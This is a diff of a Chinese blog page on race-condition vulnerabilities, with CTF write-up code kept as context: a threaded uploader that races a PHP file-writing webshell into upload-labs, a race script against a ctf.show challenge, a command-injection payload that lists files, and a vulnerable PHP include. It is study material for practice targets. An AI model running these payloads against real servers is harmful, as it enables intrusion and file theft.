@@ -7,14 +7,14 @@
 
 <head>
   <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/atkx_16x16.png">
-  <link rel="icon" href="/atkx_16x16.png">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/atkx_16x16.png">
+  <link rel="icon" href="/img/atkx_16x16.png">
   <meta name="viewport"
         content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
   <meta http-equiv="x-ua-compatible" content="ie=edge">
   
   <meta name="theme-color" content="#2f4154">
-  <meta name="description" content="摘要：条件竞争漏洞学习">
+  <meta name="description" content="">
   <meta name="author" content="Atkx">
   <meta name="keywords" content="">
   
@@ -241,8 +241,7 @@
             <h1 style="display: none">浅析条件竞争漏洞</h1>
             
             <div class="markdown-body">
-              <p>摘要：条件竞争漏洞学习</p>
- <a id="more"></a>
+               <a id="more"></a>
 
 <h2 id="0x00-条件竞争"><a href="#0x00-条件竞争" class="headerlink" title="0x00-条件竞争"></a>0x00-条件竞争</h2><p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的。开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而且他们忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果，简而言之就是并没有考虑线程同步。因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p>
 <h2 id="0x01-基础知识"><a href="#0x01-基础知识" class="headerlink" title="0x01-基础知识"></a>0x01-基础知识</h2><p>先来了解一下关于条件竞争的基础知识</p>
@@ -273,7 +272,6 @@
 <p><strong>方法二</strong>：pytho多线程上传</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding:utf-8</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">td</span>(<span class="hljs-params"><span class="hljs-built_in">list</span></span>):</span><br>    url = <span class="hljs-string">&#x27;http://localhost/upload-labs/Pass-17/index.php&#x27;</span><br>    files = &#123;<span class="hljs-string">&#x27;upload_file&#x27;</span>: (<br>        <span class="hljs-string">&#x27;shell2.php&#x27;</span>, <span class="hljs-string">&quot;&lt;?php fputs(fopen(&#x27;pass2.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php phpinfo();?&gt;&#x27;);?&gt;&quot;</span>)&#125;<br>    data = &#123;<span class="hljs-string">&#x27;submit&#x27;</span>: <span class="hljs-string">&#x27;上传&#x27;</span>&#125;<br>    r = requests.post(url=url, data=data, files=files)<br>    re = requests.get(<span class="hljs-string">&#x27;http://localhost/upload-labs/upload/shell2.php&#x27;</span>)<br>    <span class="hljs-keyword">if</span> re.status_code == <span class="hljs-number">200</span>:<br>        print(<span class="hljs-string">&#x27;上传成功&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">with</span> ThreadPoolExecutor(<span class="hljs-number">20</span>) <span class="hljs-keyword">as</span> p:<br>        p.<span class="hljs-built_in">map</span>(td, <span class="hljs-built_in">range</span>(<span class="hljs-number">200</span>))<br></code></pre></td></tr></table></figure>
 <p>访问pass2.php，也能看到phpinfo页面<br><img src="https://img-blog.csdnimg.cn/2021042619421151.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45237725/article/details/108966357">https://blog.csdn.net/qq_45237725/article/details/108966357</a></p>
 <h3 id="ctfhsow-大牛杯-web-checkin"><a href="#ctfhsow-大牛杯-web-checkin" class="headerlink" title="ctfhsow [大牛杯]-web_checkin"></a>ctfhsow [大牛杯]-web_checkin</h3><p>看<a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/116352564">羽师傅</a>的大牛杯wp，发现用到了条件竞争漏洞，照着wp复现一下。</p>
 <p>随便传参一个code=1,F12查看源码，注释提示仅允许index.php存在，删除所有其他文件，从这句话里可以猜测含有条件竞争漏洞。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;!-- 仅允许index.php存在，删除所有其他文件 --&gt;<br>xi nei~<br></code></pre></td></tr></table></figure>
@@ -287,8 +285,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-comment">#author: yu2xx</span><br>import requests<br>import threading<br>import sys<br>session=requests.session()<br>url1=<span class="hljs-string">&quot;http://bdd02bb0-9c48-4203-806f-64219749382b.challenge.ctf.show:8080/sandbox/3fa05e3dafa3d6413be416b360149b5c/&quot;</span><br>url2=<span class="hljs-string">&#x27;http://bdd02bb0-9c48-4203-806f-64219749382b.challenge.ctf.show:8080/sandbox/3fa05e3dafa3d6413be416b360149b5c/atkx&#x27;</span><br>def write():<br>	<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>		r = session.get(url1)<br>def read():<br>	<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>		r = session.get(url2)<br>		<span class="hljs-keyword">if</span> len(r.text)!=<span class="hljs-number">9561</span>: <span class="hljs-comment">#随便get传一次就能得到这个长度</span><br>    			<span class="hljs-keyword">print</span>(r.text)<br><br>threads = [threading.Thread(target=write),<br>       threading.Thread(target=read)]<br><span class="hljs-keyword">for</span> t in threads:<br>	t.start()<br></code></pre></td></tr></table></figure>
 <p>然后访问atkx可以读取到源码<br><img src="https://img-blog.csdnimg.cn/20210510193858557.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br>想要得到flag的话，直接</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?code=?&gt;&lt;?=`nl%09/*<br></code></pre></td></tr></table></figure>
-<h3 id="WMCTF2020-Make-PHP-Great-Again"><a href="#WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="[WMCTF2020]Make PHP Great Again"></a>[WMCTF2020]Make PHP Great Again</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45669205/article/details/113709363">https://blog.csdn.net/weixin_45669205/article/details/113709363</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/news/202819.html">https://www.freebuf.com/news/202819.html</a></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure>
+<h3 id="WMCTF2020-Make-PHP-Great-Again"><a href="#WMCTF2020-Make-PHP-Great-Again" class="headerlink" title="[WMCTF2020]Make PHP Great Again"></a>[WMCTF2020]Make PHP Great Again</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>highlight_file(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>  <span class="hljs-keyword">require_once</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>&#125;<br></code></pre></td></tr></table></figure>
 <p><strong>考查</strong>：利用<code>PHP_SESSION_UPLOAD_PROGRESS</code>进行文件包含</p>
 <ul>
 <li>前提: 需要知道session文件的存放位置。</li>
@@ -444,7 +441,7 @@ var now = new Date();
 
 function createtime() {
     //此处修改你的建站时间或者网站上线时间
-    var grt = new Date('02/07/2020 8:00:00');
+    var grt = new Date('03/01/2020 8:00:00');
     now.setTime(now.getTime() + 250);
     days = (now - grt) / 1000 / 60 / 60 / 24;
 
